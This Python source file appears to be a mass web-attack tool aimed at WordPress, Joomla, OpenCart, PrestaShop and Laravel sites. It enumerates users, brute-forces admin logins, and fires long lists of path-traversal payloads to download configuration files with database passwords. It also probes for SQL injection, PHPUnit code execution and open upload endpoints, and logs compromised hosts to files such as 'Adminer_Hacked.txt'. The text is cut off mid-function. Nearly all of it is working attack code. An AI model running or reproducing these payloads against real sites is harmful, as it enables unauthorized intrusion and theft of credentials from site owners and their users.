from requests import get, post, session
from os import system, name, remove
from multiprocessing import Pool, freeze_support
from socket import gethostbyname
from subprocess import check_output
from time import sleep
from threading import Thread
from re import findall
from base64 import b64encode
from json import loads
from urllib3 import disable_warnings, exceptions
disable_warnings(exceptions.InsecureRequestWarning)
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0'}

def clear():
    linux = 'clear'
    windows = 'cls'
    system([linux, windows][(name == 'nt')])


def printDomain(domain, NAMECMS):
    print('     {}[{}+{}]{} {} {}==>{} {} {} '.format(r, g, r, y, domain, y, g, NAMECMS, w))


def UserName_Enumeration(site):
    users = []
    sess = session()
    for i in range(10):
        try:
            GETSource = sess.get(('http://' + site + '/?author={}'.format(str(i + 1))), timeout=7, headers=headers)
            find = findall('/author/(.*)/"', str(GETSource.content))
            username = find[0]
            if '/feed' in str(username):
                find = findall('/author/(.*)/feed/"', str(GETSource.content))
                username2 = find[0]
                users.append(str(username2))
            else:
                users.append(str(username))
        except:
            pass

    if not len(users) == 0:
        pass
    else:
        for i in range(10):
            try:
                GETSource2 = sess.get(('http://' + site + '/wp-json/wp/v2/users/' + str(i + 1)), timeout=7, headers=headers)
                __InFo = loads(str(GETSource2.content))
                if 'id' not in str(__InFo):
                    pass
                else:
                    try:
                        users.append(str(__InFo['slug']))
                    except:
                        pass

            except:
                pass

    if not len(users) == 0:
        pass
    else:
        try:
            GETSource3 = sess.get(('http://' + site + '/author-sitemap.xml'), timeout=7, headers=headers)
            yost = findall('(<loc>(.*?)</loc>)\\s', GETSource3.content)
            for user in yost:
                users.append(str(user[1].split('/')[4]))

        except:
            pass

        if not len(users) == 0:
            pass
        else:
            users.append('admin')
        return users


def Wordpress(domain, password, username):
    Wp_session = session()
    Origin = domain
    try:
        Origin = domain.split('/')[0]
    except:
        pass

    data = {'log':username, 
     'pwd':password, 
     'wp-submit':'Log+In', 
     'redirect_to':'http://{}/wp-admin/'.format(domain), 
     'testcookie':'1'}
    pH = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 
     'Accept-Language':'en-US,en;q=0.5', 
     'Accept-Encoding':'gzip, deflate', 
     'Content-Type':'application/x-www-form-urlencoded', 
     'Origin':'http://' + Origin, 
     'Host':Origin, 
     'Referer':'http://' + Origin + '/wp-login.php', 
     'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0'}
    url = 'http://' + domain + '/wp-login.php'
    try:
        ag = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0'}
        Wp_session.get(('http://' + domain + '/wp-login.php'), timeout=5, headers=ag)
        X = Wp_session.post(url, data=data, headers=pH, timeout=5, allow_redirects=False)
        if 'id="login_error' in X.text:
            print('     {} Not Successful {}==> {}{} {} [{}] {}'.format(r, y, c, domain, y, username + ':' + password, w))
        else:
            if 'wordpress_logged_in' in str(X.cookies):
                open('vulnerability/BruteForce_wordpress.txt', 'a').write('{},{},{}\n'.format(domain + '/wp-login.php', username, password))
                print('     {} Successful     {}==> {}{} {} [{}] {}'.format(g, y, c, domain, y, username + ':' + password, w))
            else:
                print('     {} Not Successful {}==> {}{} {} [{}] {}'.format(r, y, c, domain, y, username + ':' + password, w))
    except:
        print('     {} Not Successful {}==> {}{} {} [{}] {}'.format(r, y, c, domain, y, username + ':' + password, w))


def opencart(domain, password):
    data = {'username':'admin', 
     'password':password}
    url = 'http://' + domain + '/admin/index.php?route=common/login'
    X = post(url, data=data, headers=headers, timeout=15, verify=False)
    if X.status_code == 200 and 'alert alert-danger' in X.text:
        print('     {} Not Successful {}==> {}{} {} [{}] {}'.format(r, y, c, domain, y, 'admin:' + password, w))
    else:
        if 'id="menu-dashboard"' in X.text or 'token=' in X.url:
            open('vulnerability/BruteForce_opencart.txt', 'a').write('{},{},{}\n'.format(domain + '/admin/index.php', 'admin', password))
            print('     {} Successful     {}==> {}{} {} [{}] {}'.format(g, y, c, domain, y, 'admin:' + password, w))
        else:
            print('     {} Not Successful {}==> {}{} {} [{}] {}'.format(r, y, c, domain, y, 'admin:' + password, w))


def bruteForceSTART_Wordpress(domain):
    if domain.startswith('http://'):
        domain = domain.replace('http://', '')
    else:
        if domain.startswith('https://'):
            domain = domain.replace('https://', '')
        else:
            CheckLogin_Page = get(('http://' + domain + '/wp-login.php'), timeout=4, headers=headers)
            if 'name="loginform" id="loginform"' in CheckLogin_Page.text:
                usernames = UserName_Enumeration(domain)
                passwords = open('files/passwords.txt', 'r').read().splitlines()
                for username in usernames:
                    thread = []
                    for password in passwords:
                        t = Thread(target=Wordpress, args=(domain, password, username))
                        t.start()
                        thread.append(t)
                        sleep(0.7)

                    for j in thread:
                        j.join()

            else:
                print('     {} Not Successful {}==> {}{} {} [{}] {}'.format(r, y, c, domain, r, '[wp-login.php Not found]', w))


def bruteForceSTART_opencart(domain):
    if domain.startswith('http://'):
        domain = domain.replace('http://', '')
    else:
        if domain.startswith('https://'):
            domain = domain.replace('https://', '')
        else:
            CheckLogin_Page = get(('http://' + domain + '/admin/index.php'), timeout=4, headers=headers)
            if 'common/login" method="post' in CheckLogin_Page.text or '?route=common/forgotten' in CheckLogin_Page.text:
                passwords = open('files/passwords.txt', 'r').read().splitlines()
                thread = []
                for password in passwords:
                    t = Thread(target=opencart, args=(domain, password))
                    t.start()
                    thread.append(t)
                    sleep(0.7)

                for j in thread:
                    j.join()

            else:
                print('     {} Not Successful {}==> {}{} {} [{}] {}'.format(r, y, c, domain, r, '/admin/index.php Not found', w))


class Adminer(object):

    def __init__(self, ip):
        self.ip = ReverseIP(ip)
        if self.ip == None:
            pass
        else:
            self.domains = Reverse_ip(self.ip)
            self.Adminer = []
            self.Configs = []
            if len(self.domains) <= 5:
                print('     {}[{}+{}]{} {} {}==>{} {} {} '.format(r, g, r, y, self.ip, y, r, 'Not Vuln Adminer', w))
            else:
                thread = []
                for domain in self.domains:
                    t = Thread(target=(self.adminer), args=(domain,))
                    t.start()
                    thread.append(t)
                    sleep(0.7)

                for j in thread:
                    j.join()

                if len(self.Adminer) == 0:
                    print('     {}[{}+{}]{} {} {}==>{} {} {} '.format(r, g, r, y, self.ip, y, r, 'No Adminer Founded', w))
                else:
                    thread = []
                    for domain in self.domains:
                        t = Thread(target=(self.DownloadConfig), args=(domain,))
                        t.start()
                        thread.append(t)
                        sleep(0.7)

                    for j in thread:
                        j.join()

                    if len(self.Configs) == 0:
                        print('     {}[{}+{}]{} {} {}==>{} {} {} '.format(r, g, r, y, self.ip, y, r, 'No DataBase Founded', w))
                    else:
                        with open('vulnerability/Adminer_Hacked.txt', 'a') as (Writer):
                            Writer.write(' [+] {} \n'.format(self.ip))
                            for i in self.Adminer:
                                Writer.write('   {} \n'.format(i))

                            Writer.write('------- Databaseinfo -------\n')
                            for i in self.Configs:
                                Writer.write('   {} \n'.format(i))

                            Writer.write('--------------------------------\n')
                        print('     {} Successful {}==> {}{} {}'.format(g, y, c, self.ip, w))

    def ConfigOK(self, site, path):
        try:
            SS = get(('http://' + site + path), timeout=5, headers=headers)
            if 'class="jush-sql jsonly hidden"' in str(SS.content):
                print('     {} Successful {}==> {}{} {}'.format(g, y, c, site + path, w))
                self.Adminer.append(site + path)
        except:
            pass

    def adminer(self, domain):
        LIST = [
         '/adminer.php',
         '/wp-admin/mysql-adminer.php',
         '/wp-admin/adminer.php',
         '/mysql-adminer.php',
         '/adminer/adminer.php',
         '/uploads/adminer.php',
         '/upload/adminer.php',
         '/adminer/adminer-4.7.0.php',
         '/wp-content/adminer.php',
         '/wp-content/plugins/adminer/inc/editor/index.php',
         '/wp-content/uploads/adminer.php',
         '/adminer/',
         '/_adminer.php',
         '/mirasvit_adminer_mysql.php',
         '/mirasvit_adminer_425.php',
         '/adminer/index.php',
         '/adminer1.php',
         '/mirasvit_adminer_431.php',
         '/mirasvit_adminer-4.2.3.php',
         '/adminer-4.6.2-cs.php',
         '/adminer-4.5.0.php',
         '/adminer-4.3.0.php',
         '/latest.php',
         '/latest-en.php',
         '/latest-mysql.php',
         '/latest-mysql-en.php',
         '/adminer-4.7.0.php']
        thread = []
        for path in LIST:
            t = Thread(target=(self.ConfigOK), args=(domain, path))
            t.start()
            thread.append(t)
            sleep(0.7)

        for j in thread:
            j.join()

    def Download_Config_Wordpress(self, domain, path):
        try:
            GET1 = get(('http://' + domain + path), headers=headers, timeout=4)
            if "define( 'DB_PASSWORD'" in GET1.text:
                open('vulnerability/vulnerability.txt', 'a').write('{}{}\n'.format(domain, path))
                print('     {} Successful {}==> {}{} {}'.format(g, y, c, domain + path, w))
                self.Configs.append(domain + path)
        except:
            pass

    def Download_Config_Joomla(self, domain, path):
        try:
            GET1 = get(('http://' + domain + path), headers=headers, timeout=4)
            if '$password =' in GET1.text:
                open('vulnerability/vulnerability.txt', 'a').write('{}{}\n'.format(domain, path))
                print('     {} Successful {}==> {}{} {}'.format(g, y, c, domain + path, w))
                self.Configs.append(domain + path)
        except:
            pass

    def DownloadConfig(self, domain):
        if domain.startswith('http://'):
            domain = domain.replace('http://', '')
        else:
            if domain.startswith('https://'):
                domain = domain.replace('https://', '')
            else:
                DowloadConfigWP = ['/wp-content/plugins/wp-filemanager/incl/libfile.php?&path=../../&filename=wp-config.php&action=download',
                 '/wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php',
                 '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
                 '/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php',
                 '/wp-admin/admin-ajax.php?action=kbslider_show_image&img=../wp-config.php',
                 '/wp-admin/admin-ajax.php?action=cpabc_appointments_calendar_update&cpabc_calendar_update=1&id=../../../../../../wp-config.php',
                 '/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=/&item=wp-config.php&order=name&srt=yes',
                 '/wp-admin/admin.php?page=multi_metabox_listing&action=edit&id=../../../../../../wp-config.php',
                 '/wp-content/force-download.php?file=../wp-config.php',
                 '/force-download.php?file=wp-config.php',
                 '/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php',
                 '/wp-content/plugins/google-document-embedder/libs/pdf.php?fn=lol.pdf&file=../../../../wp-config.php',
                 '/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php',
                 '/wp-content/plugins/mini-mail-dashboard-widgetwp-mini-mail.php?abspath=../../wp-config.php',
                 '/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=../../../../wp-config.php',
                 '/wp-content/plugins/recent-backups/download-file.php?file_link=../../../wp-config.php',
                 '/wp-content/plugins/simple-image-manipulator/controller/download.php?filepath=../../../wp-config.php',
                 '/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php',
                 '/wp-content/plugins/tera-charts/charts/treemap.php?fn=../../../../wp-config.php',
                 '/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php',
                 '/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php',
                 '/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php',
                 '/wp-content/plugins/wp-support-plus-responsive-ticket-system/includes/admin/downloadAttachment.php?path=../../../../../wp-config.php',
                 '/wp-content/plugins/ungallery/source_vuln.php?pic=../../../../../wp-config.php',
                 '/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php',
                 '/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php',
                 '/wp-content/plugins/mac-dock-gallery/macdownload.php?albid=../../../wp-config.php',
                 '/wp-content/plugins/eshop-magic/download.php?file=../../../../wp-config.php']
                DownloadConfigJom = [
                 '/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php',
                 '/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA=',
                 '/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php',
                 '/index.php?option=com_macgallery&view=download&albumid=../../configuration.php',
                 '/index.php?option=com_cckjseblod&task=download&file=configuration.php',
                 '/plugins/content/fsave/download.php?filename=configuration.php',
                 '/components/com_portfolio/includes/phpthumb/phpThumb.php?w=800&src=configuration.php',
                 '/index.php?option=com_picsell&controller=prevsell&task=dwnfree&dflink=../../../configuration.php',
                 '/plugins/system/captcha/playcode.php?lng=configuration.php',
                 '/index.php?option=com_rsfiles&task=download&path=../../configuration.php&Itemid=137',
                 '/index.php?option=com_addproperty&task=listing&propertyId=73&action=filedownload&fname=../configuration.php',
                 '/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes',
                 '/index.php?option=com_jtagmembersdirectory&task=attachment&download_file=/../../../../configuration.php',
                 '/index.php?option=com_facegallery&task=imageDownload&img_name=../../configuration.php',
                 '/plugins/content/s5_media_player/helper.php?fileurl=../../../configuration.php',
                 '/components/com_docman/dl2.php?archive=0&file=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==',
                 '/modules/mod_dvfoldercontent/download.php?f=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==',
                 '/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php',
                 '/index.php?option=com_jetext&task=download&file=../../configuration.php',
                 '/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1',
                 '/plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php',
                 '/index.php?option=com_community&view=groups&groupid=33&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0',
                 '/index.php?option=com_download-monitor&file=configuration.php']
                try:
                    Wordpress = get(('http://' + domain + '/wp-includes/js/jquery/jquery-migrate.min.js'), timeout=3, headers=headers)
                    check = get(('http://' + domain + ''), timeout=3, headers=headers)
                    checkJoomla = get(('http://' + domain + '/administrator/language/en-GB/en-GB.xml'), timeout=3, headers=headers)
                    W = get(('http://' + domain + '/wp-includes/ID3/license.txt'), timeout=3, headers=headers)
                    W2 = get(('http://' + domain + '/administrator/help/en-GB/toc.json'), timeout=3, headers=headers)
                    W3 = get(('http://' + domain + '/plugins/system/debug/debug.xml'), timeout=3, headers=headers)
                    laravel = get(('http://' + domain + '/.env'), timeout=3, headers=headers).text
                    try:
                        if 'DB_PASSWORD=' in laravel:
                            self.Configs.append(domain + '/.env')
                            print('     {} Successful {}==> {}{} {}'.format(g, y, c, domain + '/.env', w))
                        else:
                            if 'getID3() by James Heinrich <info@getid3.org>' in W.text:
                                thread = []
                                for path in DowloadConfigWP:
                                    t = Thread(target=(self.Download_Config_Wordpress), args=(domain, path))
                                    t.start()
                                    thread.append(t)
                                    sleep(0.7)

                                for j in thread:
                                    j.join()

                            else:
                                if '"COMPONENTS_BANNERS_BANNERS"' in W2.text:
                                    thread = []
                                    for path in DownloadConfigJom:
                                        t = Thread(target=(self.Download_Config_Joomla), args=(domain, path))
                                        t.start()
                                        thread.append(t)
                                        sleep(0.7)

                                    for j in thread:
                                        j.join()

                                else:
                                    if '<author>Joomla!' in W3.text:
                                        thread = []
                                        for path in DownloadConfigJom:
                                            t = Thread(target=(self.Download_Config_Joomla), args=(domain, path))
                                            t.start()
                                            thread.append(t)
                                            sleep(0.7)

                                        for j in thread:
                                            j.join()

                                    else:
                                        if '/*! jQuery Migrate' in Wordpress.text:
                                            thread = []
                                            for path in DowloadConfigWP:
                                                t = Thread(target=(self.Download_Config_Wordpress), args=(domain, path))
                                                t.start()
                                                thread.append(t)
                                                sleep(0.7)

                                            for j in thread:
                                                j.join()

                                        else:
                                            if '/wp-content/' in check.text:
                                                thread = []
                                                for path in DowloadConfigWP:
                                                    t = Thread(target=(self.Download_Config_Wordpress), args=(domain, path))
                                                    t.start()
                                                    thread.append(t)
                                                    sleep(0.7)

                                                for j in thread:
                                                    j.join()

                                            else:
                                                if 'Joomla! Project' in checkJoomla.text:
                                                    thread = []
                                                    for path in DownloadConfigJom:
                                                        t = Thread(target=(self.Download_Config_Joomla), args=(domain, path))
                                                        t.start()
                                                        thread.append(t)
                                                        sleep(0.7)

                                                    for j in thread:
                                                        j.join()

                    except:
                        pass

                except:
                    pass


def Sqli(domain):
    if domain.startswith('http://'):
        domain = domain.replace('http://', '')
    else:
        if domain.startswith('https://'):
            domain = domain.replace('https://', '')
        else:
            try:
                GetLink = get(('http://' + domain), timeout=10, headers=headers)
                urls = findall('href=[\\\'"]?([^\\\'" >]+)', str(GetLink.content))
                if len(urls) != 0:
                    return CheckSqliURL(domain, urls)
            except:
                pass


def CheckSqliURL(site, urls):
    MaybeSqli = []
    try:
        for url in urls:
            try:
                if '.php?' in str(url):
                    MaybeSqli.append(site + '/' + url)
            except:
                pass

        if len(MaybeSqli) != 0:
            return CheckSqli(MaybeSqli, site)
    except:
        pass


def CheckSqli(MaybeSqli, domain):
    if domain.startswith('http://'):
        domain = domain.replace('http://', '')
    else:
        if domain.startswith('https://'):
            domain = domain.replace('https://', '')
        else:
            for url in MaybeSqli:
                try:
                    error = [
                     'DB Error', 'SQL syntax;', 'mysql_fetch_assoc', 'mysql_fetch_array', 'mysql_num_rows',
                     'is_writable',
                     'mysql_result', 'pg_exec', 'mysql_result', 'mysql_num_rows', 'mysql_query', 'pg_query',
                     'System Error',
                     'io_error', 'privilege_not_granted', 'getimagesize', 'preg_match', 'mysqli_result', 'mysqli']
                    if url.startswith('http://'):
                        url = url.replace('http://', '')
                    else:
                        if url.startswith('https://'):
                            url = url.replace('https://', '')
                        else:
                            for s in error:
                                Checksqli = get(('http://' + url + "'"), timeout=5, headers=headers)
                                if s in str(Checksqli.content):
                                    SQLI = url.replace("'", '')
                                    if SQLI.startswith('http://'):
                                        SQLI = SQLI.replace('http://', '')
                                    else:
                                        if SQLI.startswith('https://'):
                                            SQLI = SQLI.replace('https://', '')
                                        else:
                                            if 'http://' in SQLI:
                                                pass
                                            open('vulnerability/vulnerability.txt', 'a').write("{}'\n".format(SQLI))
                                            print('     {} Successful {}==> {}{} {}'.format(g, y, c, SQLI, w))
                                    continue

                    break
                except:
                    pass


def plugin_Wordpress(domain, path):
    if domain.startswith('http://'):
        domain = domain.replace('http://', '')
    else:
        if domain.startswith('https://'):
            domain = domain.replace('https://', '')
        else:
            STATUS = [
             400, 401, 404, 403, 406, 500, 503, 502, 302]
            Successful_STATUS = [200, 201, 202, 203, 204, 205, 206, 207, 208, 226]
            try:
                if 'cherry-plugin' in str(path[2]):
                    post(('http://' + domain + path[0]), files={'file': ('vuln.txt', 'cherry-plugin Vuln')})
                    GET = get(('http://' + domain + '/wp-content/plugins/cherry-plugin/admin/import-export/vuln.txt'), headers=headers,
                      timeout=4)
                    if 'cherry-plugin Vuln' in GET.text:
                        open('vulnerability/vulnerability.txt', 'a').write('{}{}\n'.format(domain, path[0]))
                        print('     {} Successful {}==> {}{} {}'.format(g, y, c, domain + path[0], w))
                else:
                    GET1 = get(('http://' + domain + '/ssfadfsdfsdsdgsdf'), headers=headers, timeout=4)
                if GET1.status_code not in STATUS and GET1.status_code in Successful_STATUS:
                    pass
                else:
                    GET = get(('http://' + domain + path[0]), headers=headers, timeout=4)
                    if path[1] in GET.text:
                        open('vulnerability/vulnerability.txt', 'a').write('{}{}\n'.format(domain, path[0]))
                        print('     {} Successful {}==> {}{} {}'.format(g, y, c, domain + path[0], w))
            except:
                pass


def plugin_Joomla(domain, path):
    if domain.startswith('http://'):
        domain = domain.replace('http://', '')
    else:
        if domain.startswith('https://'):
            domain = domain.replace('https://', '')
        else:
            STATUS = [
             400, 401, 404, 403, 406, 500, 503, 502, 302]
            Successful_STATUS = [200, 201, 202, 203, 204, 205, 206, 207, 208, 226]
            try:
                GET1 = get(('http://' + domain + '/ssfadfsdfsdsdgsdf'), headers=headers, timeout=4)
                if GET1.status_code not in STATUS and GET1.status_code in Successful_STATUS:
                    pass
                else:
                    GET = get(('http://' + domain + path[0]), headers=headers, timeout=4)
                    if GET.status_code not in STATUS:
                        if GET.status_code in Successful_STATUS:
                            open('vulnerability/vulnerability.txt', 'a').write('{}{}\n'.format(domain, path[0]))
                            print('     {} Successful {}==> {}{} {}'.format(g, y, c, domain + path[0], w))
            except:
                pass


def prestashopScan(domain, path):
    if domain.startswith('http://'):
        domain = domain.replace('http://', '')
    else:
        if domain.startswith('https://'):
            domain = domain.replace('https://', '')
        else:
            STATUS = [
             400, 401, 404, 403, 406, 500, 503, 502, 302]
            Successful_STATUS = [200, 201, 202, 203, 204, 205, 206, 207, 208, 226]
            try:
                GET1 = get(('http://' + domain + '/ssfadfsdfsdsdgsdf'), headers=headers, timeout=4)
                if GET1.status_code not in STATUS and GET1.status_code in Successful_STATUS:
                    pass
                else:
                    GET = get(('http://' + domain + path), headers=headers, timeout=4)
                    if GET.status_code not in STATUS:
                        if GET.status_code in Successful_STATUS:
                            open('vulnerability/vulnerability.txt', 'a').write('{}{}\n'.format(domain, path))
                            print('     {} Successful {}==> {}{} {}'.format(g, y, c, domain + path, w))
            except:
                pass


def Download_Config_Wordpress(domain, path):
    if domain.startswith('http://'):
        domain = domain.replace('http://', '')
    else:
        if domain.startswith('https://'):
            domain = domain.replace('https://', '')
        else:
            try:
                GET1 = get(('http://' + domain + path), headers=headers, timeout=4)
                if "define( 'DB_PASSWORD'" in GET1.text:
                    open('vulnerability/Config_download.txt', 'a').write('{}{}\n'.format(domain, path))
                    print('     {} Successful {}==> {}{} {}'.format(g, y, c, domain + path, w))
            except:
                pass


def Download_Config_Joomla(domain, path):
    if domain.startswith('http://'):
        domain = domain.replace('http://', '')
    else:
        if domain.startswith('https://'):
            domain = domain.replace('https://', '')
        else:
            try:
                GET1 = get(('http://' + domain + path), headers=headers, timeout=4)
                if '$password =' in GET1.text:
                    open('vulnerability/Config_download.txt', 'a').write('{}{}\n'.format(domain, path))
                    print('     {} Successful {}==> {}{} {}'.format(g, y, c, domain + path, w))
            except:
                pass


def Vulnscan_Unknown(domain, path):
    if domain.startswith('http://'):
        domain = domain.replace('http://', '')
    else:
        if domain.startswith('https://'):
            domain = domain.replace('https://', '')
        else:
            Sqli(domain)
            try:
                if 'PHPunit' in path[2]:
                    wik = get(('http://{}{}'.format(domain, path[0])), data='<?php phpinfo();?>', timeout=5)
                    if 'phpinfo' in wik.text:
                        open('vulnerability/vulnerability.txt', 'a').write('{}{}\n'.format(domain, path[0]))
                        print('     {} Successful {}==> {}{} {}'.format(g, y, c, domain + path[0], w))
                else:
                    GET1 = get(('http://' + domain + path[0]), headers=headers, timeout=4)
                if path[1] in GET1.text:
                    open('vulnerability/vulnerability.txt', 'a').write('{}{}\n'.format(domain, path[0]))
                    print('     {} Successful {}==> {}{} {}'.format(g, y, c, domain + path[0], w))
            except:
                pass


def vulnScanner_prestashop(domain):
    if domain.startswith('http://'):
        domain = domain.replace('http://', '')
    else:
        if domain.startswith('https://'):
            domain = domain.replace('https://', '')
        else:
            vulnprestashop = ['/modules/columnadverts/uploadimage.php',
             '/modules/soopabanners/uploadimage.php',
             '/modules/soopamobile/uploadimage.php',
             '/modules/vtermslideshow/uploadimage.php',
             '/modules/simpleslideshow/uploadimage.php',
             '/modules/productpageadverts/uploadimage.php',
             '/modules/homepageadvertise2/uploadimage.php',
             '/modules/jro_homepageadvertise/uploadimage.php',
             '/modules/attributewizardpro/file_upload.php',
             '/modules/1attributewizardpro/file_upload.php',
             '/modules/attributewizardpro.OLD/file_upload.php',
             '/modules/attributewizardpro_x/file_upload.php',
             '/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php',
             '/modules/cartabandonmentpro/upload.php',
             '/modules/cartabandonmentproOld/upload.php',
             '/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload',
             '/modules/wg24themeadministration/wg24_ajax.php',
             '/modules/fieldvmegamenu/ajax/upload.php',
             '/modules/wdoptionpanel/wdoptionpanel_ajax.php',
             '/modules/pk_flexmenu/ajax/upload.php',
             '/modules/pk_vertflexmenu/ajax/upload.php',
             '/modules/nvn_export_orders/upload.php',
             '/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php',
             '/modules/lib/redactor/file_upload.php',
             '/modules/masseditproduct/lib/redactor/file_upload.php']
            thread = []
            for path in vulnprestashop:
                t = Thread(target=prestashopScan, args=(domain, path))
                t.start()
                thread.append(t)
                sleep(0.7)

            for j in thread:
                j.join()


def vulnScanner_unknown(domain):
    if domain.startswith('http://'):
        domain = domain.replace('http://', '')
    else:
        if domain.startswith('https://'):
            domain = domain.replace('https://', '')
        else:
            vulns = [['/.env', 'DB_PASSWORD=', 'Laravel Config'],
             [
              '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'phpinfo', 'Laravel PHPunit']]
            thread = []
            for path in vulns:
                t = Thread(target=Vulnscan_Unknown, args=(domain, path))
                t.start()
                thread.append(t)
                sleep(0.7)

            for j in thread:
                j.join()


def vulnScanner_jom(domain):
    if domain.startswith('http://'):
        domain = domain.replace('http://', '')
    else:
        if domain.startswith('https://'):
            domain = domain.replace('https://', '')
        else:
            DownloadConfig = ['/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php',
             '/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA=',
             '/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php',
             '/index.php?option=com_macgallery&view=download&albumid=../../configuration.php',
             '/index.php?option=com_cckjseblod&task=download&file=configuration.php',
             '/plugins/content/fsave/download.php?filename=configuration.php',
             '/components/com_portfolio/includes/phpthumb/phpThumb.php?w=800&src=configuration.php',
             '/index.php?option=com_picsell&controller=prevsell&task=dwnfree&dflink=../../../configuration.php',
             '/plugins/system/captcha/playcode.php?lng=configuration.php',
             '/index.php?option=com_rsfiles&task=download&path=../../configuration.php&Itemid=137',
             '/index.php?option=com_addproperty&task=listing&propertyId=73&action=filedownload&fname=../configuration.php',
             '/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes',
             '/index.php?option=com_jtagmembersdirectory&task=attachment&download_file=/../../../../configuration.php',
             '/index.php?option=com_facegallery&task=imageDownload&img_name=../../configuration.php',
             '/plugins/content/s5_media_player/helper.php?fileurl=../../../configuration.php',
             '/components/com_docman/dl2.php?archive=0&file=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==',
             '/modules/mod_dvfoldercontent/download.php?f=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==',
             '/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php',
             '/index.php?option=com_jetext&task=download&file=../../configuration.php',
             '/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1',
             '/plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php',
             '/index.php?option=com_community&view=groups&groupid=33&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0',
             '/index.php?option=com_download-monitor&file=configuration.php']
            jom_vulns = [
             [
              '/index.php?option=com_adsmanager&task=upload&tmpl=component', 'com_adsmanager'],
             [
              '/administrator/components/com_alberghi/upload.alberghi.php', 'com_alberghi'],
             [
              '/index.php?option=com_b2jcontact&view=loader&owner=component&id=1&bid=1&root=none&filename=none&type=uploader', 'com_b2jcontact'],
             [
              '/administrator/components/com_bt_portfolio/helpers/uploadify/uploadify.php', 'com_bt_portfolio'],
             [
              '/administrator/components/com_extplorer/uploadhandler.php', 'com_extplorer'],
             [
              '/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php', 'com_civicrm'],
             [
              '/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=', 'com_fabrik'],
             [
              '/components/com_facileforms/libraries/jquery/uploadify.php', 'com_facileforms'],
             [
              '/components/com_foxcontact/foxcontact.php', 'com_foxcontact'],
             [
              '/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form', 'com_jce'],
             [
              '/index.php?option=com_jdownloads&Itemid=0&view=upload', 'com_jdownloads'],
             [
              '/index.php?option=com_jwallpapers&task=upload', 'com_jwallpapers'],
             [
              '/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=', 'com_media'],
             [
              '/index.php?option=com_myblog&task=ajaxupload', 'com_myblog'],
             [
              '/components/com_oziogallery/imagin/scripts_ralcr/filesystem/writeToFile.php', 'com_oziogallery'],
             [
              '/administrator/components/com_redmystic/chart/ofc-library/ofc_upload_image.php', 'com_redmystic'],
             [
              '/administrator/components/com_rokdownloads/assets/uploadhandler.php', 'com_rokdownloads'],
             [
              '/components/com_sexycontactform/fileupload/', 'com_sexycontactform'],
             [
              '/administrator/components/com_simplephotogallery/lib/uploadFile.php', 'com_simplephotogallery'],
             [
              '/index.php/component/users/?task=user.register', 'com_users']]
            thread = []
            for path in jom_vulns:
                t = Thread(target=plugin_Joomla, args=(domain, path))
                t.start()
                thread.append(t)
                sleep(0.7)

            for j in thread:
                j.join()


def vulnScanner_wp(domain):
    if domain.startswith('http://'):
        domain = domain.replace('http://', '')
    else:
        if domain.startswith('https://'):
            domain = domain.replace('https://', '')
        else:
